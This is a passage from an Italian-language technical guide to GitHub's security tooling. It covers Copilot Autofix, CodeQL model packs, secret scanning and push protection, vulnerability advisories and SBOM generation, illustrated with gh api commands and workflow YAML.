  -f dismissed_comment="Validazione input presente a monte in middleware"
```

### Copilot Autofix per Code Scanning

Copilot Autofix è una funzionalità integrata nel code scanning che utilizza modelli linguistici di grandi dimensioni (LLM) per generare automaticamente suggerimenti di fix per gli alert di sicurezza rilevati da CodeQL. A differenza degli strumenti tradizionali che si limitano a segnalare il problema, Autofix propone una soluzione concreta che lo sviluppatore può accettare, modificare o rifiutare.

#### Disponibilità

- **Repository pubblici** — Gratuito per tutti, senza necessità di licenza Copilot
- **Repository privati** — Richiede licenza GitHub Code Security (parte di GHAS)
- **Abilitazione** — Attivo di default per ogni repository che usa CodeQL

#### Funzionamento Tecnico

```
Flusso di Copilot Autofix:

1. CodeQL analizza il codice e identifica una vulnerabilità
2. Il contesto dell'alert (codice sorgente, data flow path, regola violata)
   viene inviato all'LLM
3. L'LLM genera:
   - Una spiegazione testuale del problema
   - Un diff con il codice corretto
   - Un'analisi dell'impatto della modifica
4. Lo sviluppatore vede il suggerimento nella PR o nell'alert view
5. Il fix può essere applicato con un singolo click ("Commit fix")
   o modificato prima dell'applicazione
```

#### Metriche di Efficacia (dati 2025)

| Metrica | Valore |
|---------|--------|
| Tempo mediano di fix con Autofix | 28 minuti |
| Tempo mediano di fix manuale | 1.5 ore |
| Miglioramento velocità | 3x più veloce |
| Alert risolti con Autofix (2025) | 460,000+ |
| Tempo medio di risoluzione complessivo | 0.66 ore (con Autofix) vs 1.29 ore (senza) |

#### Assegnazione Alert a Copilot

A partire da ottobre 2025, è possibile assegnare alert di code scanning direttamente a Copilot per la remediation automatica. Questa funzionalità estende il Copilot coding agent alle vulnerabilità di sicurezza:

```bash
# Assegnare un alert a Copilot via API (public preview)
gh api repos/{owner}/{repo}/code-scanning/alerts/42 -X PATCH \
  -f assignee="copilot" \
  --jq '{number, state, assignee}'

# Copilot genererà automaticamente un fix e creerà una PR
# Il fix viene generato analizzando:
# - Il data flow path identificato da CodeQL
# - Il contesto del codice circostante
# - Le best practice di sicurezza per il linguaggio e il framework
# - I pattern di fix applicati con successo in casi simili
```

#### Espansione della Copertura Autofix (2025)

A febbraio 2025, GitHub ha ampliato significativamente la gamma di alert CodeQL per cui Copilot Autofix può suggerire una correzione. Questa espansione ha interessato categorie di alert che rappresentano il 29% di tutti gli alert CodeQL rilevati, con risultati misurabili:

```
Impatto dell'espansione di febbraio 2025:

  Categoria di miglioramento              Valore
  ─────────────────────────────────────────────────────────
  Alert CodeQL coperti dall'espansione     29% del totale
  Aumento complessivo alert con Autofix    +8%
  Aumento Autofix per il gruppo espanso    +270%
  ─────────────────────────────────────────────────────────

  Linguaggi supportati per Autofix (aggiornamento 2025-2026):
    C#, C/C++, Go, Java/Kotlin, Swift,
    JavaScript/TypeScript, Python, Ruby, Rust

  Suite di query supportate:
    - default (query di sicurezza standard)
    - security-extended (query aggiuntive a precisione inferiore)

  Nota: Autofix non è disponibile per alert generati da
  strumenti di terze parti (Semgrep, Snyk, Checkmarx) caricati
  tramite SARIF. Solo gli alert CodeQL nativi ricevono Autofix.
```

L'espansione ha migliorato particolarmente la copertura per le categorie di vulnerabilità più comuni: injection flaws (SQL injection, command injection, XSS), errori di autenticazione e autorizzazione, e gestione impropria dei dati sensibili. Per queste categorie, il tasso di Autofix disponibili è cresciuto dal 35% al 65% circa.

#### Metriche Autofix nella Security Overview (2025)

A dicembre 2025, GitHub ha perfezionato le metriche relative a Copilot Autofix visualizzate nella Security Overview dashboard. Le metriche aggiornate calcolano con maggiore precisione quanto di un suggerimento Autofix è stato effettivamente utilizzato dallo sviluppatore per rimediare agli alert, distinguendo tra:

- **Fix completamente accettati** — Lo sviluppatore ha applicato il suggerimento Autofix senza modifiche
- **Fix parzialmente utilizzati** — Lo sviluppatore ha modificato il suggerimento prima di committare
- **Fix rifiutati** — Lo sviluppatore ha scritto un fix manuale ignorando il suggerimento

Queste metriche consentono ai team di sicurezza di valutare l'efficacia reale di Autofix e identificare le categorie di vulnerabilità dove i suggerimenti automatici sono più affidabili, guidando le decisioni su quali alert automatizzare e quali richiedono intervento manuale specializzato.

#### Limitazioni di Autofix

```
Limitazioni da considerare:
  - Non tutti gli alert hanno un Autofix disponibile
    (la copertura è in espansione costante)
  - I fix generati dall'LLM devono sempre essere verificati
    dallo sviluppatore — trattare l'output come suggerimento,
    non come soluzione certificata
  - Autofix funziona meglio per vulnerabilità con pattern
    di fix ben definiti (SQLi, XSS, path traversal)
  - Per vulnerabilità architetturali complesse, il fix
    potrebbe essere parziale o insufficiente
  - Il fix potrebbe non considerare il contesto business
    completo dell'applicazione
```

### CodeQL Model Packs

I model packs consentono di estendere l'analisi CodeQL per riconoscere librerie e framework non supportati nativamente. Sono particolarmente utili per organizzazioni che utilizzano librerie interne o framework meno diffusi.

#### Cosa Sono i Model Packs

Un model pack è un pacchetto che contiene **data extensions** — file YAML che descrivono come aggiungere informazioni sul flusso di dati per nuove dipendenze. Quando un model pack viene specificato nella configurazione di code scanning, le data extensions vengono aggiunte automaticamente all'analisi.

```yaml
# Esempio di data extension per un framework custom
# .github/codeql/extensions/custom-framework.yml
extensions:
  - addsTo:
      pack: codeql/javascript-all
      extensible: sourceModel
    data:
      - ["my-framework", "Request", false, "getBody", "", "Argument[0]", "remote", "manual"]
      - ["my-framework", "Request", false, "getQuery", "", "ReturnValue", "remote", "manual"]

  - addsTo:
      pack: codeql/javascript-all
      extensible: sinkModel
    data:
      - ["my-framework", "Database", false, "rawQuery", "", "Argument[0]", "sql-injection", "manual"]
      - ["my-framework", "Template", false, "render", "", "Argument[1]", "html-injection", "manual"]
```

#### Sanitizers e Validators nei Model Packs (2026)

A partire da CodeQL 2.25.2 (aprile 2026), è possibile definire sanitizers e validators personalizzati nelle data extensions. Questo consente di modellare le funzioni di validazione e sanitizzazione specifiche del progetto senza scrivere query CodeQL personalizzate:

```yaml
# Definire un sanitizer personalizzato
extensions:
  - addsTo:
      pack: codeql/javascript-all
      extensible: sanitizerModel
    data:
      # [package, type, subtypes, name, signature, input, output, kind]
      - ["my-utils", "Sanitizer", false, "escapeHtml", "", "Argument[0]", "ReturnValue", "html-injection"]
      - ["my-utils", "Sanitizer", false, "sanitizeSql", "", "Argument[0]", "ReturnValue", "sql-injection"]

  - addsTo:
      pack: codeql/javascript-all
      extensible: validatorModel
    data:
      - ["my-utils", "Validator", false, "isValidEmail", "", "Argument[0]", "ReturnValue", "input-validation"]
```

Linguaggi supportati per model packs: C/C++, C#, Go, Java/Kotlin, JavaScript/TypeScript, Python, Ruby, Rust.

#### Configurazione a Livello di Organizzazione

I model packs possono essere configurati a livello di organizzazione per garantire copertura uniforme:

```bash
# Configurare model packs per tutta l'organizzazione
# Settings → Code security → Code scanning → CodeQL
# Aggiungere i model packs che verranno usati da tutti i repository
# con default setup abilitato

# I pack vengono pubblicati nel GitHub Container Registry:
# ghcr.io/org-name/codeql-model-pack:1.0.0

# Creare e pubblicare un model pack
codeql pack init my-org/custom-models
# Aggiungere le data extensions nella directory del pack
codeql pack publish my-org/custom-models
```

### CodeQL Default Setup vs Advanced Setup

GitHub offre due modalità di configurazione per CodeQL:

| Aspetto | Default Setup | Advanced Setup |
|---------|---------------|----------------|
| Configurazione | Zero-config, abilitazione con un click | Workflow YAML personalizzabile |
| Query | Suite `default` (o `extended` se selezionata) | Qualsiasi suite, pack, o query custom |
| Linguaggi | Rilevamento automatico | Specificati esplicitamente nella matrix |
| Build | Build automatica per linguaggi compilati | Comandi di build personalizzabili |
| Scheduling | GitHub gestisce lo scheduling | Cron personalizzabile nel workflow |
| Model packs | Configurabili a livello org | Specificabili nel workflow YAML |
| Threat models | Configurabili nelle impostazioni | Specificabili in codeql-config.yml |
| Quando usare | La maggior parte dei repository | Repository con build complessi, custom queries, o requisiti specifici |

```bash
# Abilitare default setup via API
gh api repos/{owner}/{repo}/code-scanning/default-setup -X PATCH \
  --input - << 'EOF'
{
  "state": "configured",
  "query_suite": "extended",
  "languages": ["javascript-typescript", "python"]
}
EOF

# Verificare lo stato del default setup
gh api repos/{owner}/{repo}/code-scanning/default-setup \
  --jq '{state, query_suite, languages, schedule}'
```

#### Miglioramenti di CodeQL 2.20 — Precisione e Performance (2025)

La versione CodeQL 2.20, rilasciata nella prima metà del 2025, ha introdotto miglioramenti sostanziali sia nella precisione dei risultati che nelle performance di scansione. Questi miglioramenti derivano da una riscrittura parziale del motore di analisi del flusso dati e dall'introduzione di euristiche di pruning più aggressive per ridurre i falsi positivi.

```
Confronto performance CodeQL 2.18 vs 2.20:

  Metrica                                   2.18        2.20        Δ
  ──────────────────────────────────────────────────────────────────────
  Falsi positivi (JS/TS)                    baseline    -42%        ↓↓
  Falsi positivi (Java/Kotlin)              baseline    -31%        ↓↓
  Falsi positivi (Python)                   baseline    -28%        ↓
  Tempo scansione (100k LOC, default)       ~45 sec     ~28 sec     -38%
  Tempo aggiuntivo unified scanning         ~19 sec     ~12 sec     -37%
  Copertura query security-extended         287 query   342 query   +19%
  ──────────────────────────────────────────────────────────────────────

  "Unified scanning" = scansione multi-linguaggio in un singolo job,
  introdotta con default setup. Il tempo aggiuntivo è il costo
  incrementale per ogni linguaggio oltre il primo.
```

I miglioramenti chiave di CodeQL 2.20 includono:

- **Analisi inter-procedurale migliorata** — Il motore di taint tracking ora segue i flussi di dati attraverso catene di chiamate più lunghe (fino a 12 livelli di profondità, rispetto ai 8 della versione 2.18), rilevando vulnerabilità in architetture a più strati
- **Pruning dei falsi positivi basato su contesto** — Nuove euristiche identificano i pattern di sanitizzazione comuni nei framework popolari (Express.js, Spring Boot, Django, Rails) riducendo drasticamente i falsi positivi senza perdere veri positivi
- **Model packs aggiornati** — I model packs per framework di terze parti sono stati arricchiti con oltre 400 nuove definizioni di source, sink e sanitizer, migliorando la copertura per librerie come Prisma, tRPC, FastAPI e gRPC
- **Supporto migliorato per Rust** — CodeQL 2.20 ha raggiunto la parità di funzionalità con i linguaggi più maturi per l'analisi di codice Rust, includendo taint tracking completo e supporto per unsafe blocks

La riduzione dei falsi positivi ha un impatto diretto sull'adozione: con meno rumore negli alert, gli sviluppatori mantengono fiducia nello strumento e risolvono gli alert più rapidamente. GitHub ha riportato che i repository che hanno aggiornato a CodeQL 2.20 hanno visto un aumento del 23% nel tasso di risoluzione degli alert entro 14 giorni dal rilevamento.

---

## Secret Scanning

### Funzionamento

Secret scanning analizza automaticamente il repository per trovare credenziali, token e chiavi API committed accidentalmente. Il funzionamento:

1. **Pattern matching** — GitHub mantiene una lista di 200+ pattern regex per segreti noti (token GitHub, AWS keys, Stripe keys, ecc.)
2. **Partner notification** — Quando viene trovato un segreto, GitHub notifica il provider (es. AWS, Slack, Stripe) che può revocare automaticamente la chiave
3. **Alert creation** — Un alert viene creato nel tab Security del repository
4. **Historical scanning** — Tutti i commit nella storia vengono scansionati, non solo i nuovi push

### Pattern Supportati (Selezione)

| Provider | Pattern rilevati |
|---|---|
| GitHub | Personal Access Tokens, OAuth tokens, App tokens, SSH keys |
| AWS | Access Key ID, Secret Access Key, Session Token |
| Azure | Storage keys, AD client secrets, SAS tokens, Connection strings |
| Google Cloud | API keys, OAuth secrets, Service account keys |
| Stripe | Secret keys, Restricted keys, Webhook signing secrets |
| Twilio | API keys, Auth tokens |
| Slack | Bot tokens, Webhook URLs, OAuth tokens |
| SendGrid | API keys |
| npm | Access tokens |
| NuGet | API keys |
| Docker Hub | Access tokens |
| Databricks | Access tokens |
| Shopify | API keys, shared secrets |
| SSH | Private keys (RSA, DSA, ECDSA, Ed25519) |
| Generic | JWT tokens, Database connection strings |

### Push Protection — Dettaglio Operativo

Push protection **blocca i push prima che raggiungano il repository**. È un controllo server-side — non dipende da hook locali.

```bash
# Abilitare push protection per un singolo repository
gh api repos/{owner}/{repo} -X PATCH \
  --input - << 'EOF'
{
  "security_and_analysis": {
    "secret_scanning_push_protection": {
      "status": "enabled"
    }
  }
}
EOF

# Abilitare per tutta l'organizzazione
gh api orgs/{org} -X PATCH \
  --input - << 'EOF'
{
  "security_and_analysis": {
    "secret_scanning_push_protection": {
      "status": "enabled"
    }
  }
}
EOF
```

Quando un push viene bloccato:

```
remote: ─────────────────────────────────────────────────────────
remote:  Push Protection
remote: ─────────────────────────────────────────────────────────
remote:  Push protection detected secrets in the following commits:
remote:
remote:  — commit abc1234: AWS Secret Access Key found in config.py:15
remote:  — commit def5678: GitHub Personal Access Token found in .env:3
remote:
remote:  To push these commits, you must either:
remote:    1. Remove the secrets from your commits (recommended)
remote:    2. Use a push protection bypass with a justification
remote:
remote:  Bypass URL: https://github.com/org/repo/security/secret-scanning/unblock-secret/abc123
remote: ─────────────────────────────────────────────────────────
```

### Bypass della Push Protection

Tre opzioni di bypass:

1. **Fix the issue** (raccomandato) — Rimuovere il segreto e riscrivere la storia
2. **Mark as false positive** — Se il pattern matchato non è un vero segreto
3. **Used in tests** — Se il segreto è usato in test e non è una credenziale reale
4. **Fix later** — Accettare il rischio con una giustificazione

```bash
# Dopo il bypass, un audit log entry viene creato:
# - Chi ha fatto il bypass
# - Quale motivo è stato specificato
# - Timestamp
# - Quale segreto è stato bypassato

# Il proprietario dell'organizzazione riceve una notifica email per ogni bypass

# Visualizzare i bypass recenti (audit log)
gh api orgs/{org}/audit-log?phrase=action:secret_scanning_push_protection.bypass \
  --jq '.[] | {actor: .actor, created_at, bypass_reason: .data.bypass_reason}'
```

### Delegated Bypass (Enterprise)

Per le organizzazioni Enterprise, è possibile delegare l'approvazione dei bypass a un team specifico:

```
Repository Settings > Code security > Secret scanning > Push protection
  ☑ Require approvals to bypass push protection
  Bypass list: @org/security-team
```

Questo significa che uno sviluppatore che vuole fare bypass deve richiedere l'approvazione del team di sicurezza.

#### Evoluzione del Delegated Bypass (2025)

A settembre 2025, GitHub ha esteso il delegated bypass a livello Enterprise, consentendo di definire una policy di bypass centralizzata applicata automaticamente a tutte le organizzazioni sotto l'Enterprise account. Questo elimina la necessità di configurare il delegated bypass singolarmente per ogni organizzazione.

```
Gerarchia delle policy di bypass (2025):

  Enterprise Policy (livello più alto)
    │
    ├── Definisce i team autorizzati ad approvare bypass
    │   per TUTTE le organizzazioni dell'Enterprise
    │
    ├── Può essere overridden a livello org?
    │   → Configurabile: "enforce" (no override) o "allow" (org può personalizzare)
    │
    └── Audit trail centralizzato
        → Tutte le richieste di bypass, approvazioni e rifiuti
          visibili nella Enterprise audit log

  Organization Policy (livello intermedio)
    │
    ├── Eredita dalla Enterprise policy se impostata
    ├── Può aggiungere team approvatori aggiuntivi
    └── Può restringere (mai allargare) la policy Enterprise

  Repository Settings (livello più basso)
    │
    └── Mostra lo stato del bypass ma non può modificare
        la policy se impostata a livello superiore
```

A febbraio 2025, GitHub ha introdotto una **REST API per la gestione delle richieste di bypass**, permettendo ai team di sicurezza di integrare il processo di approvazione con strumenti esterni (Slack, PagerDuty, Jira Service Management):

```bash
# Listare le richieste di bypass pendenti per l'organizzazione
gh api orgs/{org}/secret-scanning/push-protection-bypasses \
  --jq '.[] | select(.status == "pending") | {
    id: .id,
    requester: .requester.login,
    repository: .repository.name,
    secret_type: .secret_type_display_name,
    created_at: .created_at,
    reason: .reason
  }'

# Approvare una richiesta di bypass via API
gh api orgs/{org}/secret-scanning/push-protection-bypasses/{bypass_id} \
  -X PATCH -f status="approved" \
  -f reviewer_comment="Verificato: segreto di test in ambiente sandbox"

# Rifiutare una richiesta di bypass
gh api orgs/{org}/secret-scanning/push-protection-bypasses/{bypass_id} \
  -X PATCH -f status="denied" \
  -f reviewer_comment="Segreto di produzione — rimuovere e ruotare"
```

A dicembre 2025, GitHub ha ampliato i **permessi per i Security Manager** a livello organizzazione, consentendo ai membri con il ruolo "security manager" di gestire i custom pattern di secret scanning e le configurazioni di push protection senza richiedere il ruolo di organization owner. Questo permette una separazione dei compiti più granulare tra chi amministra l'organizzazione e chi gestisce le policy di sicurezza.

### Custom Patterns

Definire pattern personalizzati per segreti specifici dell'organizzazione:

```bash
# Pattern a livello di repository
gh api repos/{owner}/{repo}/secret-scanning/custom-patterns -X POST \
  --input - << 'EOF'
{
  "name": "Internal API Key",
  "pattern": "MYORG-[A-Za-z0-9]{32}",
  "description": "Chiave API interna dell'organizzazione",
  "before": "(api[_-]?key|token|secret)\\s*[:=]\\s*['\"]?",
  "after": "['\"]?"
}
EOF

# Pattern a livello di organizzazione
gh api orgs/{org}/secret-scanning/custom-patterns -X POST \
  --input - << 'EOF'
{
  "name": "Internal Database Password",
  "pattern": "DB_PASS_[A-Za-z0-9!@#$%^&*]{16,64}",
  "description": "Password di database interne con prefisso standard"
}
EOF

# Dry-run: testare un pattern senza abilitarlo
gh api repos/{owner}/{repo}/secret-scanning/custom-patterns -X POST \
  --input - << 'EOF'
{
  "name": "Test Pattern",
  "pattern": "MYORG-[A-Za-z0-9]{32}",
  "state": "disabled"
}
EOF
```

### Gestione degli Alert

```bash
# Listare gli alert di secret scanning
gh api repos/{owner}/{repo}/secret-scanning/alerts \
  --jq '.[] | {number, secret_type: .secret_type_display_name, state, created_at}'

# Dettaglio di un alert specifico
gh api repos/{owner}/{repo}/secret-scanning/alerts/1 \
  --jq '{secret_type, locations_url, push_protection_bypassed, push_protection_bypassed_by: .push_protection_bypassed_by.login}'

# Risolvere un alert
gh api repos/{owner}/{repo}/secret-scanning/alerts/1 -X PATCH \
  -f state="resolved" \
  -f resolution="revoked"

# Risoluzioni possibili:
# false_positive — Non è un vero segreto
# revoked — Segreto revocato/ruotato
# used_in_tests — Usato solo nei test
# wont_fix — Accettato come rischio
```

### Cosa Fare Quando un Segreto Viene Rilevato

```
1. REVOCARE immediatamente il segreto presso il provider
   (anche se il commit è stato rimosso — potrebbe essere in cache, fork, ecc.)

2. Generare un nuovo segreto con il provider

3. Aggiornare il nuovo segreto nel secret manager / GitHub Secrets

4. Rimuovere il segreto dalla storia Git:
   $ git filter-repo --invert-paths --path file-con-segreto.env
   # oppure con BFG Repo-Cleaner:
   $ bfg --replace-text passwords.txt repo.git

5. Force-push (necessario dopo rewrite della storia):
   $ git push --force-with-lease

6. Risolvere l'alert in GitHub:
   $ gh api repos/{owner}/{repo}/secret-scanning/alerts/1 -X PATCH \
     -f state="resolved" -f resolution="revoked"

7. Verificare audit log per eventuali accessi non autorizzati
```

### Rilevamento di Password Generiche con Copilot AI

A partire dal 2025, GitHub secret scanning utilizza Copilot per rilevare password e credenziali generiche che non corrispondono a nessun pattern di provider specifico. Questa funzionalità affronta un problema fondamentale: molti segreti non seguono un formato riconoscibile (come i token AWS che iniziano con `AKIA`), ma sono password arbitrarie hardcoded nel codice.

#### Architettura del Rilevamento AI

```
Flusso di rilevamento delle password generiche:

1. FASE 1 — Scansione iniziale (GPT-3.5-Turbo)
   → Analizza il codice alla ricerca di pattern sospetti
   → Identifica variabili con nomi come "password", "secret", "credential"
   → Valuta il contesto: è un test? Un placeholder? Un valore reale?

2. FASE 2 — Conferma (GPT-4)
   → Riceve i candidati dalla Fase 1
   → Applica ragionamento più profondo (Chain of Thought)
   → Valuta la probabilità che sia una credenziale reale
   → Riduce i falsi positivi

3. RISULTATO
   → Se entrambi i modelli confermano: alert creato
   → Gli alert generici sono separati dagli alert per pattern di provider
   → Classificati come "generic" (precedentemente "experimental")
```

#### Gestione degli Alert Generici

Gli alert per password generiche vengono visualizzati in una lista separata rispetto agli alert per pattern di provider, per evitare confusione:

```bash
# Visualizzare alert per password generiche
gh api repos/{owner}/{repo}/secret-scanning/alerts \
  --jq '.[] | select(.secret_type_display_name == "Generic Password") | {
    number,
    secret_type: .secret_type_display_name,
    state,
    created_at,
    location: .locations_url
  }'

# Triage degli alert generici:
# - Verificare se è un valore di test o placeholder → risolvere come false_positive
# - Verificare se è una credenziale reale → revocare e risolvere come revoked
# - Verificare se il contesto indica uso in test → risolvere come used_in_tests
```

#### Tasso di Falsi Positivi

Il rilevamento generico ha un tasso di falsi positivi più alto rispetto ai pattern specifici dei provider. Questo è un compromesso intenzionale: meglio avere alcuni falsi positivi che lasciar passare credenziali reali. Per questo motivo, GitHub separa gli alert generici in una lista dedicata e non abilita di default la push protection per i pattern generici.

### Validity Checks per Segreti

Per i segreti di provider partner (non per pattern generici o custom), GitHub esegue validity checks — verifiche con il provider per determinare se il segreto rilevato è ancora attivo:

```
Flusso di validity check:

1. GitHub rileva un segreto che corrisponde a un pattern di un provider partner
2. GitHub invia una richiesta al provider per verificare la validità
3. Il provider risponde con lo stato:
   - "active" — Il segreto è ancora valido e funzionante
   - "inactive" — Il segreto è stato revocato o è scaduto
   - "possibly_active" — Non è possibile determinare con certezza
   - "unknown" — Il provider non supporta il check o non ha risposto
4. Lo stato viene mostrato nell'alert

Provider che supportano validity checks (selezione):
  - GitHub (PATs, OAuth tokens, App tokens)
  - AWS (Access Keys)
  - Azure (Storage keys, AD secrets)
  - Google Cloud (API keys)
  - Slack (Bot tokens)
  - Stripe (Secret keys)
  - npm (Access tokens)
  - NuGet (API keys)
  - SendGrid (API keys)
```

```bash
# Verificare lo stato di validità di un alert
gh api repos/{owner}/{repo}/secret-scanning/alerts/5 \
  --jq '{
    secret_type: .secret_type_display_name,
    validity: .validity,
    state,
    push_protection_bypassed
  }'

# Filtrare alert per segreti ancora attivi
gh api repos/{owner}/{repo}/secret-scanning/alerts \
  --jq '.[] | select(.validity == "active") | {
    number,
    secret_type: .secret_type_display_name,
    created_at
  }'
```

### Extended Metadata per Segreti (2026)

A partire da febbraio 2026, GitHub fornisce metadati estesi per i segreti rilevati, quando disponibili dal provider:

| Metadato | Descrizione | Utilità |
|----------|-------------|---------|
| Owner name | Nome del proprietario del segreto | Identificare chi ha creato il segreto |
| Owner email | Email del proprietario | Contattare il responsabile per la revoca |
| Identifier | Identificativo univoco del segreto | Verificare esattamente quale chiave è compromessa |
| Creation date | Data di creazione del segreto | Valutare l'esposizione temporale |
| Expiry date | Data di scadenza del segreto | Determinare se il segreto è ancora valido |

Questi metadati accelerano significativamente il processo di incident response: invece di dover investigare quale specifico segreto è stato esposto, le informazioni sono immediatamente disponibili nell'alert.

### Configurazione dei Pattern nella Push Protection (2025)

A partire da agosto 2025, è possibile configurare quali pattern di secret scanning sono inclusi nella push protection. Questo consente un controllo fine su cosa viene bloccato durante il push:

```
Repository Settings → Code security → Secret scanning → Push protection

Opzioni per ogni categoria di pattern:
  ☑ High-confidence partner patterns (default: abilitato)
    → Token AWS, GitHub PATs, Stripe keys, ecc.
    → Bassissimo tasso di falsi positivi

  ☑ Configurable partner patterns (default: variabile)
    → Pattern con tasso di falsi positivi leggermente più alto
    → Configurabili individualmente

  ☐ Custom patterns (default: disabilitato per push protection)
    → Pattern definiti dall'organizzazione
    → Possono essere abilitati selettivamente per push protection

  ☐ Generic patterns / Copilot-detected (default: disabilitato)
    → Password generiche rilevate da AI
    → Alto tasso di falsi positivi, non consigliato per push protection
```

### Rilevamento di Segreti Base64-Encoded (2025)

A partire da novembre 2025, GitHub rileva automaticamente segreti codificati in base64 nella push protection. Questa funzionalità chiude un vettore di evasione comune: gli sviluppatori (o gli attaccanti) che codificano i segreti in base64 per aggirare i pattern scanner tradizionali.

```bash
# Esempio di segreto che viene ora rilevato:
# Originale: AKIAIOSFODNN7EXAMPLE
# Base64:    QUtJQUlPU0ZPRE5ON0VYQU1QTEU=

# Il push viene bloccato anche se il segreto è in formato base64
# purché il pattern decodificato corrisponda a un pattern noto
```

---

## Security Advisories e Private Vulnerability Reporting

### Private Vulnerability Reporting (PVR)

Dal 2023, GitHub supporta la segnalazione privata di vulnerabilità direttamente dal tab Security del repository:

```bash
# Abilitare PVR
gh api repos/{owner}/{repo} -X PATCH \
  -F security_and_analysis[private_vulnerability_reporting][status]="enabled"
```

Il flusso completo:

1. **Segnalazione** — Un ricercatore clicca "Report a vulnerability" nel tab Security
2. **Notifica** — I maintainer ricevono una notifica privata
3. **Advisory privato** — GitHub crea un draft advisory non pubblico
4. **Collaborazione** — I maintainer possono invitare il segnalante come collaboratore
5. **Fork privato** — GitHub crea un fork privato per sviluppare la patch
6. **CVE request** — I maintainer possono richiedere un CVE ID tramite GitHub (CNA autorizzato)
7. **Pubblicazione** — Advisory e release con la fix vengono pubblicati simultaneamente

### Creare un Advisory

```bash
# Creare un security advisory privato
gh api repos/{owner}/{repo}/security-advisories -X POST \
  --input - << 'EOF'
{
  "summary": "SQL Injection in user search endpoint",
  "description": "## Impact\n\nThe `/api/users/search` endpoint is vulnerable to SQL injection via the `q` parameter. An unauthenticated attacker can extract data from the database.\n\n## Patches\n\nPatched in version 2.1.0.\n\n## Workarounds\n\nDisable the search endpoint until the update is applied.\n\n## References\n\n- CWE-89: SQL Injection",
  "severity": "high",
  "cvss_vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
  "vulnerabilities": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "my-package"
      },
      "vulnerable_version_range": "< 2.1.0",
      "patched_versions": "2.1.0",
      "vulnerable_functions": ["searchUsers"]
    }
  ],
  "cwe_ids": ["CWE-89"],
  "credits": [
    {
      "login": "security-researcher",
      "type": "reporter"
    }
  ]
}
EOF

# Aggiungere un collaboratore all'advisory
gh api repos/{owner}/{repo}/security-advisories/{advisory_id}/collaborators -X POST \
  -f login="security-researcher"

# Richiedere un CVE
gh api repos/{owner}/{repo}/security-advisories/{advisory_id}/cve -X POST

# Pubblicare l'advisory
gh api repos/{owner}/{repo}/security-advisories/{advisory_id} -X PATCH \
  -f state="published"
```

### SECURITY.md

```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 3.x.x  | :white_check_mark: |
| 2.x.x  | :white_check_mark: (security fixes only) |
| 1.x.x  | :x:                |
| < 1.0   | :x:                |

## Reporting a Vulnerability

We take security seriously. If you discover a security vulnerability, please report it responsibly.

**DO NOT** open a public GitHub issue for security vulnerabilities.

### Preferred Method

Use [GitHub Private Vulnerability Reporting](../../security/advisories/new) to report vulnerabilities directly through GitHub.

### Alternative Method

Email: security@example.com (PGP key available at /pgp-key.asc)

### What to Include

- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

### Response Timeline

- **Acknowledgment**: Within 48 hours
- **Assessment**: Within 1 week
- **Fix timeline**: Based on severity
  - Critical: 24 hours
  - High: 1 week
  - Medium: 1 month
  - Low: Next release

### Recognition

We maintain a Hall of Fame for security researchers who responsibly disclose vulnerabilities.
```

---

## Dependency Graph e SBOM

### Dependency Graph

Il dependency graph mostra tutte le dipendenze dirette e transitive di un repository. È la base su cui Dependabot costruisce i suoi alert.

```bash
# Visualizzare il dependency graph
gh api repos/{owner}/{repo}/dependency-graph/sbom \
  --jq '.sbom.packages[] | {name, versionInfo, supplier}'

# Esportare SBOM (Software Bill of Materials) in formato SPDX
gh api repos/{owner}/{repo}/dependency-graph/sbom > sbom.json

# Formato del SBOM:
# - SPDX 2.3 (standard ISO)
# - Contiene: nome pacchetto, versione, licenza, supplier, relazioni
```

#### Requisiti Normativi per SBOM (2025-2026)

La generazione di SBOM è diventata un requisito normativo in diversi contesti regolatori e di compliance. L'Executive Order 14028 degli Stati Uniti (maggio 2021) ha stabilito che i fornitori di software del governo federale devono produrre SBOM per ogni rilascio. Il Cyber Resilience Act (CRA) dell'Unione Europea, entrato in vigore nel 2024, impone ai produttori di prodotti con elementi digitali di mantenere un SBOM aggiornato e renderlo disponibile alle autorità di sorveglianza del mercato. In questo contesto, l'SBOM generato automaticamente da GitHub via dependency graph offre un punto di partenza solido, ma le organizzazioni devono verificare che copra anche le dipendenze non gestite dai package manager supportati (librerie vendored, binari compilati staticamente, dipendenze di sistema). Per colmare queste lacune, GitHub ha introdotto la Dependency Submission API che permette di integrare nel dependency graph anche le dipendenze rilevate da strumenti di terze parti come Syft, Trivy e Grype, garantendo un SBOM completo indipendentemente dall'ecosistema di build utilizzato.

La combinazione di SBOM automatici, Dependency Submission API e artifact attestations (descritte nella sezione successiva) consente alle organizzazioni di soddisfare i requisiti di trasparenza della supply chain richiesti sia dall'EO 14028 che dal CRA europeo, con un overhead minimo sul processo di sviluppo.

### SBOM in CI

```yaml
# .github/workflows/sbom.yml
name: Generate SBOM

on:
  release:
    types: [published]

jobs:
  sbom:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4

      - name: Generate SBOM via GitHub API
        run: |
          gh api repos/${{ github.repository }}/dependency-graph/sbom > sbom-spdx.json
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Generate CycloneDX SBOM
        uses: CycloneDX/gh-node-module-generatebom@v1
        with:
          output: sbom-cyclonedx.json

      - name: Attach to release
        run: |
          gh release upload "${{ github.event.release.tag_name }}" \
            sbom-spdx.json \
            sbom-cyclonedx.json
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Dependency Submission API

Per ecosistemi non supportati nativamente, sottomettere il grafo manualmente:

```yaml
# .github/workflows/dependency-submission.yml
name: Dependency Submission

on:
  push:
    branches: [main]

jobs:
  submit:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4

      # Maven
      - name: Submit Maven dependencies
        uses: advanced-security/maven-dependency-submission-action@v4

      # Gradle
      # - uses: mikepenz/gradle-dependency-submission@v1

      # Generic (qualsiasi formato)
      # - uses: advanced-security/component-detection-submission-action@v1
```

### Dependency Review (PR Check)

Blocca PR che introducono dipendenze con vulnerabilità note:

```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review

on:
  pull_request:
    branches: [main]

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          # Blocca PR con vulnerabilità di questa severità o superiore
